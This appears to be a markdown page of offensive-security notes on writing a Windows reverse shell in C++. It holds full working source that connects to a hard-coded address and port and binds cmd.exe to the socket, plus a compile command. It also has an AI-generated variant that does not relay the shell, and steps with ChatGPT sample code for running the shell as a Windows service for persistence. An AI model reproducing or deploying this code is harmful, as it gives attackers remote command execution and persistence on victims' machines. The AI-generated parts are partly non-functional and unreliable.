# Reverse Shell | C/C++

Original Code:

```cpp
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

int main()
{
  SOCKET shell;
  sockaddr_in shell_addr;
  WSADATA wsa;
  STARTUPINFOW si;
  PROCESS_INFORMATION pi;
  char RecvServer[512];
  int connection;
  char ip_addr[] = "192.168.139.100";
  int port = 8081;
  WCHAR CmdProcess[] = L"C:\\WINDOWS\\System32\\cmd.exe";

  WSAStartup(MAKEWORD(2, 2), &wsa);                                                                   // Initialize Winsock
  shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); // Create a tcp socket

  shell_addr.sin_port = htons(port);
  shell_addr.sin_family = AF_INET;
  shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

  connection = WSAConnect(shell, (SOCKADDR *)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); // Connect to the target server

  if (connection == SOCKET_ERROR)
  {
    printf("[!] Connection to the target server failed. Please try again!\n");
    exit(0);
  }
  else
  {
    printf("[!] Connection to target server successful!\n");
    recv(shell, RecvServer, sizeof(RecvServer), 0);
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;                // Pipe std input/output/err to the socket
    CreateProcessW(NULL, CmdProcess, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); // Spawn Command Prompt process
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    memset(RecvServer, 0, sizeof(RecvServer));
  }
}
```

---

AI Code:

```cpp
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

int main()
{
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    char RecvServer[512];
    int connection;
    char ip_addr[] = "192.168.139.100";
    int port = 8081;
    WCHAR CmdProcess[] = L"C:\\WINDOWS\\System32\\cmd.exe";

    WSAStartup(MAKEWORD(2, 2), &wsa);                                                                   // Initialize Winsock
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); // Create a tcp socket

    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = WSAConnect(shell, (SOCKADDR *)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); // Connect to the target server

    if (connection == SOCKET_ERROR)
    {
        printf("[!] Connection to the target server failed. Please try again!\n");
        exit(0);
    }
    else
    {
        printf("[!] Connection to target server successful!\n");
        recv(shell, RecvServer, sizeof(RecvServer), 0);

        // Set up pipes for standard input, output, and error redirection
        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
        HANDLE stdinPipeRead, stdinPipeWrite;
        HANDLE stdoutPipeRead, stdoutPipeWrite;
        HANDLE stderrPipeRead, stderrPipeWrite;

        CreatePipe(&stdinPipeRead, &stdinPipeWrite, &sa, 0);
        CreatePipe(&stdoutPipeRead, &stdoutPipeWrite, &sa, 0);
        CreatePipe(&stderrPipeRead, &stderrPipeWrite, &sa, 0);

        // Set up startup info
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = stdinPipeRead;
        si.hStdOutput = stdoutPipeWrite;
        si.hStdError = stderrPipeWrite;

        // Spawn Command Prompt process
        CreateProcessW(NULL, CmdProcess, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        // Close unused pipe ends
        CloseHandle(stdinPipeRead);
        CloseHandle(stdoutPipeWrite);
        CloseHandle(stderrPipeWrite);

        // You can read from stdoutPipeRead and stderrPipeRead if needed

        // Wait for the process to exit
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Clean up handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(stdoutPipeRead);
        CloseHandle(stderrPipeRead);

        memset(RecvServer, 0, sizeof(RecvServer));
    }
}
```

Compiling linking the ws2_32 library file:

```sh
g++ -o rev-shell.exe rev-shell.cpp -lws2_32
```

To create a Windows service:

1. **Define Service Control Handler:**
   
   - Define a function to handle service control requests (e.g., `ServiceCtrlHandler`):
   
   ```cpp
   // Service control handler function
   DWORD WINAPI ServiceCtrlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext);
   ```

2. **Define Service Main Function:**
   
   - Define the main service function (`ServiceMain`) where you'll set up the service registration and initialize resources:
   
   ```cpp
   // Service main function
   void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv);
   ```

3. **Service Registration:**
   
   - In the `ServiceMain` function, set up the service registration using `StartServiceCtrlDispatcher`:
   
   ```cpp
   void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
   {
       // Set up service registration
       SERVICE_TABLE_ENTRY ServiceTable[] =
       {
           { L"MyServiceName", ServiceMain },
           { NULL, NULL }
       };
   
       StartServiceCtrlDispatcher(ServiceTable);
   }
   ```

4. **Service Control Handler Implementation:**
   
   - Implement the `ServiceCtrlHandler` function to handle start, stop, and other control requests:
   
   ```cpp
   DWORD WINAPI ServiceCtrlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext)
   {
       switch (dwControl)
       {
           case SERVICE_CONTROL_STOP:
               // Implement service stop logic
               // Stop reverse shell and cleanup
               // Set service status to SERVICE_STOP_PENDING
               break;
           // Other control cases as needed
       }
   
       return NO_ERROR;
   }
   ```

5. **Start the Reverse Shell:**
   
   - Within your service's start logic, integrate your reverse shell code:
   
   ```cpp
   void StartReverseShell()
   {
       // Implement reverse shell setup
       // Set up socket connection
       // Execute command logic
   }
   ```

6. **Service Entry Point:**
   
   - Define the main entry point function and call `StartReverseShell` when the service starts:
   
   ```cpp
   int _tmain(int argc, _TCHAR* argv[])
   {
       // Set up service status
       // Register service control handler
       // Call StartReverseShell() when service starts
       // Implement service control loop
   }
   ```

Sample source code (ChatGPT3.5)

```cpp
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

SERVICE_STATUS        g_ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE                g_ServiceStopEvent = NULL;

void ServiceCtrlHandler(DWORD);
void ServiceMain(DWORD, LPTSTR*);

void StartReverseShell()
{
    // Your reverse shell code here
    // Set up socket connection
    // Execute command logic
}

void ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
    g_StatusHandle = RegisterServiceCtrlHandler(L"MyServiceName", ServiceCtrlHandler);

    if (g_StatusHandle == NULL)
    {
        return;
    }

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;

    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL)
    {
        // Handle error
        return;
    }

    StartReverseShell();

    WaitForSingleObject(g_ServiceStopEvent, INFINITE);

    CloseHandle(g_ServiceStopEvent);
}

void ServiceCtrlHandler(DWORD dwCtrl)
{
    switch (dwCtrl)
    {
        case SERVICE_CONTROL_STOP:
            if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
                break;

            // Stop reverse shell and cleanup
            g_ServiceStatus.dwControlsAccepted = 0;
            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            g_ServiceStatus.dwWin32ExitCode = 0;
            g_ServiceStatus.dwCheckPoint = 4;

            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);

            // Signal the service to stop
            SetEvent(g_ServiceStopEvent);
            break;
    }
}

int main(int argc, char *argv[])
{
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { L"MyServiceName", (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    StartServiceCtrlDispatcher(ServiceTable);

    return 0;
}
```
